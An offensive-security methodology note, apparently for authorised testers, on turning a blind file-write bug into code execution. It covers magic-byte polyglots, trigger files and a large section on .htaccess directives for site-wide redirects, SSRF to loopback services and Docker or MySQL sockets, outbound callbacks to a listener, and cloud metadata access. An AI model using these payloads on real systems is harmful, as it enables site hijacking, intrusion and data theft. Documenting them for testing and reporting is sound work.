# Write primitives: oracle differentials, host fingerprinting, polyglots, triggers

## 1. Blind writer → filesystem oracle

Upload services that stage then rename (`write(path)` → `path.part` → `rename`) leak the staging path in their error. The differential:

| Response | Meaning |
|---|---|
| `No such file or directory: '/x/y.part'` | parent directory does not exist on the writer's FS |
| `(Invalid file type)` / magic-number rejection | directory exists **and is writable**; only the content gate failed |
| success message | file written |

That differential is a reliable directory-existence oracle. Use it to map the writer's filesystem **before** theorising about where the writer lives. File-write-as-root plus a path oracle is a legitimate high finding on its own.

Probe both an expected-missing path and an expected-present one in the same round so the two responses are comparable; a single ENOENT proves nothing without the contrast.

## 2. Fingerprinting the writer's host

- The service URL says nothing about its filesystem. `/opt/<app>/...` returning ENOENT while `/var/www/html` exists only proves the writer's FS differs from the app host's.
- Plant a uniquely-named file, then fetch it back from **every candidate IP × every `Host:` vhost**. Distinguish real hits from catch-all SPAs: a 200 whose body is the SPA index (identical size across unrelated paths, `Content-Type: text/html`) is not your file.
- Absence of `/etc/nginx` or `/opt/<app>` plus an existing `/root/.ssh` usually means **a container with its own root FS**, not the site's host. Writes then land where nothing executes them.
- If the docroot candidates exist on the writer but nothing you plant is ever served anywhere, stop probing paths and treat it as a disconnected FS (container, separate network segment).

## 3. Content gates and polyglots

Magic-byte allowlists are prefix checks — the rest of the file is unconstrained.

- PNG `\x89PNG\r\n\x1a\n` — **contains `\r\n`**, unsafe for line-oriented config consumers
- JPEG `\xff\xd8\xff\xe0` (+ `\x00\x10JFIF\x00\x01...`) — no newline; the right choice when the file must also parse as a config
- PHP tolerates arbitrary bytes before `<?php`, so a magic-prefixed PHP polyglot is valid PHP — but that only matters if a runtime executes it.

## 4. Triggers that do not fire (and why)

| Trigger | Real cause |
|---|---|
| `/etc/cron.d/<file>` | ignored when the file is group/other-writable, when it lacks a trailing newline, or when the container has no cron daemon |
| `authorized_keys` written via `/root/.ssh/` | the container's root is not read by any host sshd; and you may not know which host consumes it |
| app auto-deploy on file change | the scanned directory is not on the app's classpath / docroot |
| systemd unit / spool dir | no matching daemon, or the file is never read on that FS |

Diagnose once (does the daemon exist? is the FS shared? what mode did the write produce?), record the conclusion as a dead end, and stop re-planting.

## 5. Proving execution

A write becomes a shell only when all three hold:

1. the written path is inside a docroot / executable path of a server **you can reach**
2. that server's runtime executes the extension you wrote (working FPM for `.php`, an app scanner for `.jsp`/`.asp`, a WSGI reload for `.py`)
3. the required magic prefix does not break the runtime's parsing

Prove with a marker request (`GET /<planted>.php?c=id`) and expect command output — not a 200, not the raw file body.

## 6. Reporting shape

State, in order: the primitive (which user, arbitrary path), the mapped filesystem, the content gate and exactly how it was bypassed, the proof file path, and the single remaining condition for execution. Keep hunting that condition; do not restate the write as "getshell".

## 7. Per-directory config as the pivot (`.htaccess`)

The one file class whose *content is executed as instructions* by the served host. Full routing control of a vhost with zero payload-file serving: redirect every visitor, swap error bodies for phishing/XSS, flip status codes, DoS.

Why it works when payload files do not: config **inherits down the directory tree**, so a config written to a *parent* of the real docroot still applies site-wide. That single fact explains the otherwise-contradictory pair "my `.htaccess` takes effect, my `.txt` is 404" — the docroot is a subdirectory of where you wrote, or the two classes are served by different origins. It is **not** a disconnected filesystem.

Directive-class oracle — run once, in this order, and note which class answers:

| Probe | Expected | Meaning |
|---|---|---|
| `Redirect 302 /<unique-tag> http://example.com/` | 302, `Location: http://example.com/` | per-directory config confirmed; cleanest proof, nothing else emits that Location |
| `RedirectMatch 302 ^/$ /index.html` | 302 on `/` only | surgical; also the repair for a root you broke yourself |
| `DirectoryIndex disabled` | `/` → 403, other paths still resolve | the directory you wrote is on the request path |
| `ErrorDocument 403 /index.html` (and `404`) | same status, swapped body | error-body control; the status stays, so body-change-without-status-change is the control signal |
| `RewriteEngine On` + `RewriteRule` | fires? | if it does not while the above all do, per-dir `mod_rewrite` is not effective here — stop tuning rewrite rules and stay on mod_alias |

Execution limits to check before promising RCE: `/cgi-bin/<x>` must actually exist (no `ScriptAlias` ⇒ 404), and the extension must have a loaded handler. `AddType application/x-httpd-php`, `AddHandler cgi-script`, `Options +ExecCGI` in `.htaccess` change nothing when the vhost has no `mod_php`/`mod_cgi` — those directives are worth one attempt, not a campaign.

Missing-module signatures — the vhost tells you which modules are loaded by *how* it fails:

| Probe | Response | Meaning |
|---|---|---|
| `SetHandler proxy:fcgi://127.0.0.1:9000/…/index.php` | raw file bytes, 200 | `mod_proxy_fcgi` not loaded; no FPM socket to talk to |
| `SetHandler "proxy:unix:/var/run/docker.sock\|http://localhost/"` | 503 | `mod_proxy` dialled but the socket is not in the Apache process's mount namespace — no daemon socket at this layer. Socket-path variants (`/run/docker.sock`, containerd, podman) are the same negative: one attempt, then stop. |
| `RewriteRule ^x$ "proxy:unix:/run/docker.sock\|http://localhost/" [P]` | 500, site-wide | **syntax error, not a block or WAF** — `proxy:unix:` is valid only as a `SetHandler` value; a `[P]` substitution must be a real URL. Misreading the 500 as "blocked" leaves a broken directive live: restore the config before probing further. |
| `Action application/x-httpd-cgi /bin/bash` + a handler | 500 on the mapped path | `mod_cgi` not loaded |
| `AddHandler` a handler name no module owns | 403 across the whole site while the directive is live | handler unowned — remove it before it DoSes the site |
| `AddType application/x-httpd-php .php` (any `AddType`/`AddHandler` naming a module the vhost does not load) | **500 across the whole site** while the directive is live | directive names a handler no loaded module owns. A self-inflicted outage that reads exactly like a WAF/block — never conclude "the site went down" or "they blocked us" before restoring the known-good baseline and re-checking health (`/` and `/index.html`) |
| `.php` request | raw body, or site-wide 403 from a server-level deny | no `mod_php`; the interpreter is elsewhere or absent |
| `<!--#exec cmd="id"-->` in a served page | the raw comment comes back | `mod_include`/SSI off |

### 7a. Internal SSRF through the config (URI control, socket oracle)

`SetHandler "proxy:http://127.0.0.1:<port>/"` reaches loopback-only services but sends the **local filesystem path** as the request URI, so the backend sees `/var/www/html/<site>/<file>` where you wanted `/api/x`. When the backend routes on the path, substitute a real URL instead:

```
RewriteEngine On
RewriteRule ^p<tag>/(.*)$ "http://127.0.0.1:3100/$1" [P,L]
```

`/p<tag>/status` then arrives as `/status`. `<Files "x">SetHandler …</Files>` is the fallback when per-dir rewrite does not engage.

`mod_proxy_http` also speaks HTTP over a **unix socket**, which turns the probe into a socket oracle for sockets that have no other reachable channel:

| Response to `SetHandler "proxy:unix:<path>|http://localhost/"` | Meaning |
|---|---|
| 200 / real HTTP body | an HTTP service listens on that socket |
| 502 | socket dialled, peer is not speaking HTTP — a DB socket answers exactly this way (`/run/mysqld/mysqld.sock`) |
| 503 | dial failed: path absent, or the socket is in another mount namespace |
| the file's own bytes, 200 | handler not honoured at all (module missing) — see the table above |

The 502-vs-503 split is the load-bearing one: it separates "socket exists, wrong protocol" from "no socket here". Candidates: `/run/mysqld/mysqld.sock`, `/var/run/mysqld/mysqld.sock`, `/run/php/*-fpm.sock`, `/run/docker.sock`.

Budget the writes. A writer capped at a few files per record still covers a whole matrix in ONE config: give each backend its own `<FilesMatch "\.q1$">…</FilesMatch>` block (extension → port/socket) and probe `/x.q1`, `/x.q2`, … Re-check the site's health between config generations.

### 7b. Pacing the origin

Every probe is a request the **target** serves. A few hundred rapid-fire SSRF round-trips saturate a small origin and turn all later responses into timeouts, which reads exactly like "the pivot broke". Pace proxied fuzzing (≥0.5–1 s between attempts, small batches), sanity-check a known-open lightweight endpoint before each batch, and after any kill/timeout verify site health **and restore the config** before probing further. A saturated origin recovers by itself within minutes once the traffic stops.

Outbound callback — the same config makes the origin *initiate* connections: origin-IP discovery, SSRF and metadata access in one:

| Directive | Requirement / tell |
|---|---|
| `RewriteEngine On` + `RewriteRule (.*/)?<tag>$ http://<listener-ip>:<port>/<tag> [P,L]` | `mod_rewrite` per-dir effective; the pattern MUST tolerate the per-dir prefix (`(.*/)?`) or it never matches |
| `<Files "<tag>">SetHandler "proxy:http://<listener-ip>:<port>/"</Files>` | `mod_proxy`; a 503 on the request already proves the origin dialled out; the proxied request path leaks the origin's real DocumentRoot (e.g. `/var/www/html/report/…`) |
| `Redirect` / `RedirectMatch` | **not** a callback — moves the client, never the server |

Peer IP at your listener = the origin address. Reuse the channel for `http://169.254.169.254/` (Hetzner `/hetzner/v1/metadata` and `/hetzner/v1/user-data`, AWS `/latest/meta-data/`) and internal-only services; expect `public-keys: []` on hosts that were never given cloud-init SSH keys, and treat every metadata field as an untrusted string.

Verify the content gate empirically rather than assuming it strips your magic prefix: write a file containing one marker string, fetch it back through the served path, and inspect the first bytes. A gate that validates only the prefix often stores the prefix too.

Write-service limits: a record takes a fixed number of files (e.g. 5) before the service starts answering rate-limit / record-not-found errors, and — worse — a rejected write still returns an error object while the loop continues, so the whole batch's results become false negatives. Gate every write on the success field and back off instead of hammering.

## 8. Multi-origin and self-healing docroots

Two failure modes look identical from a fetch-back loop. Distinguish them before drawing any conclusion:

| Observation | Meaning | Action |
|---|---|---|
| Same URL, body length oscillating between two fixed values across requests; a static asset drifting the same way | **Weak** signal: edge cache variants over one origin look identical, and a real second origin is the rarer cause | vary the request path (edge cache key), re-check, and only then pin an origin and verify against it |
| Config write takes effect, payload files 404, served pages keep their original size/hash | the write landed outside the real docroot — the per-site docroot is a subdir of what you wrote | find the true DocumentRoot (the outbound-callback row in §7 leaks it) and write inside it; do not reach for a cleaner/load-balancer theory first |
| A served file (`index.html`, `script.js`) keeps its original `Last-Modified`, size and hash after repeated writes | docroot is rebuilt/restored from a whitelist, or served from a different FS than the writer's | switch to config writes (section 7); record `Last-Modified` before/after as the canary |
| Payload writes 404 everywhere, config writes take effect | docroot is a subdir of the write path, or config is inherited from a shared parent | stop enumerating subdirectory names; use config, or locate the true docroot with the section-7 oracle |
| Nothing changes anywhere, any class | disconnected FS (container/segment) | stop planting; report the primitive and the missing leg |

Detection recipe: in one run, hit the same URL many times and print `status | len | Last-Modified | sha1(body[:200])`. Length drift on a page that should be static is the tell for load balancing — not for your write. Cache-buster query strings do **not** help if the edge ignores the query in its cache key; vary the path or send `Cache-Control: no-cache` and re-check before believing a 403/404.
